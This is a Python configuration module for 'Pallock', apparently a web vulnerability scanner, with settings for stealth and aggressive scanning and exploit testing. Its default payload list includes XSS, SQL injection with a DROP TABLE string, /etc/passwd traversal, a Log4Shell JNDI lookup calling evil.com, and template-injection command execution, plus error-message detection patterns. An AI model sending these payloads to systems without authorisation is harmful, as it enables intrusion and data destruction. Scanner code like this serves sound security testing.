"""
Pallock Configuration Module
Advanced configuration management for zero-day vulnerability scanner
"""

import os
import json
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from rich.console import Console

console = Console()

@dataclass
class Config:
    """Main configuration class for Pallock scanner."""
    
    # Scanner settings
    max_threads: int = 10
    timeout: int = 30
    delay: float = 0.5
    retries: int = 3
    user_agent: str = "Pallock/1.0.0 (Zero-Day Scanner)"
    
    # Scanning modes
    deep_scan: bool = False
    zero_day_only: bool = False
    aggressive_mode: bool = False
    stealth_mode: bool = False
    
    # Network settings
    proxy: Optional[str] = None
    follow_redirects: bool = True
    verify_ssl: bool = False
    max_redirects: int = 5
    
    # Detection settings
    enable_ai_detection: bool = True
    enable_heuristics: bool = True
    enable_signature_matching: bool = True
    enable_behavior_analysis: bool = True
    
    # Zero-day detection settings
    zero_day_patterns: List[str] = field(default_factory=list)
    suspicious_payloads: List[str] = field(default_factory=list)
    anomaly_threshold: float = 0.7
    
    # Output settings
    output_format: str = "html"
    output_file: Optional[str] = None
    verbose: bool = False
    quiet: bool = False
    
    # Advanced settings
    max_depth: int = 3
    max_pages: int = 1000
    crawl_external: bool = False
    include_subdomains: bool = True
    
    # Exploit settings
    enable_exploit_testing: bool = True
    safe_exploits_only: bool = True
    poc_generation: bool = True
    
    # API keys (loaded from environment)
    shodan_api_key: Optional[str] = None
    virustotal_api_key: Optional[str] = None
    censys_api_id: Optional[str] = None
    censys_api_secret: Optional[str] = None
    
    # Threat intelligence
    enable_threat_intel: bool = True
    threat_intel_sources: List[str] = field(default_factory=lambda: [
        "shodan", "virustotal", "censys", "threatcrowd"
    ])
    
    def __post_init__(self):
        """Initialize configuration after creation."""
        self.load_default_payloads()
        self.load_api_keys()
        self.validate_config()
    
    def load_default_payloads(self):
        """Load default suspicious payloads and patterns."""
        self.suspicious_payloads = [
            "<script>alert(1)</script>",
            "' OR 1=1--",
            "../../../etc/passwd",
            "<img src=x onerror=alert(1)>",
            "'; DROP TABLE users;--",
            "<iframe src=javascript:alert(1)>",
            "${jndi:ldap://evil.com/exploit}",
            "{{7*7}}",
            "#{1+1}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{config.__class__.__init__.__globals__}}",
            "__proto__.polluted=true",
            "constructor.prototype.polluted=true"
        ]
        
        self.zero_day_patterns = [
            r"exception.*in.*template",
            r"freemarker.*error",
            r"velocity.*exception",
            r"thymeleaf.*processing.*error",
            r"jinja2.*undefined.*error",
            r"deserialization.*error",
            r"untrusted.*data.*deserialization",
            r"json.*parsing.*error.*unexpected.*token",
            r"xml.*parsing.*error.*entity",
            r"ldap.*error.*code",
            r"jndi.*lookup.*failed",
            r"log4j.*error",
            r"slf4j.*error",
            r"prototype.*pollution",
            r"__proto__.*modified",
            r"constructor.*prototype.*modified"
        ]
    
    def load_api_keys(self):
        """Load API keys from environment variables."""
        self.shodan_api_key = os.getenv('SHODAN_API_KEY')
        self.virustotal_api_key = os.getenv('VIRUSTOTAL_API_KEY')
        self.censys_api_id = os.getenv('CENSYS_API_ID')
        self.censys_api_secret = os.getenv('CENSYS_API_SECRET')
    
    def validate_config(self):
        """Validate configuration settings."""
        if self.max_threads <= 0:
            raise ValueError("max_threads must be positive")
        
        if self.timeout <= 0:
            raise ValueError("timeout must be positive")
        
        if not 0 <= self.anomaly_threshold <= 1:
            raise ValueError("anomaly_threshold must be between 0 and 1")
    
    def update_from_args(self, args):
        """Update configuration from command line arguments."""
        if hasattr(args, 'threads') and args.threads:
            self.max_threads = args.threads
        
        if hasattr(args, 'timeout') and args.timeout:
            self.timeout = args.timeout
        
        if hasattr(args, 'user_agent') and args.user_agent:
            self.user_agent = args.user_agent
        
        if hasattr(args, 'proxy') and args.proxy:
            self.proxy = args.proxy
        
        if hasattr(args, 'deep_scan') and args.deep_scan:
            self.deep_scan = True
        
        if hasattr(args, 'zero_day_only') and args.zero_day_only:
            self.zero_day_only = True
        
        if hasattr(args, 'verbose') and args.verbose:
            self.verbose = True
        
        if hasattr(args, 'quiet') and args.quiet:
            self.quiet = True
    
    def save_to_file(self, filepath: str):
        """Save configuration to JSON file."""
        config_dict = {
            key: value for key, value in self.__dict__.items()
            if not key.startswith('_')
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config_dict, f, indent=2, default=str)
    
    def load_from_file(self, filepath: str):
        """Load configuration from JSON file."""
        if not os.path.exists(filepath):
            console.print(f"[yellow]Config file {filepath} not found, using defaults[/yellow]")
            return
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                config_dict = json.load(f)
            
            for key, value in config_dict.items():
                if hasattr(self, key):
                    setattr(self, key, value)
            
            console.print(f"[green]Configuration loaded from {filepath}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error loading config: {e}[/red]")
    
    def get_headers(self) -> Dict[str, str]:
        """Get HTTP headers for requests."""
        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
        return headers
    
    def __str__(self):
        """String representation of configuration."""
        return f"PallockConfig(threads={self.max_threads}, timeout={self.timeout}, deep_scan={self.deep_scan})"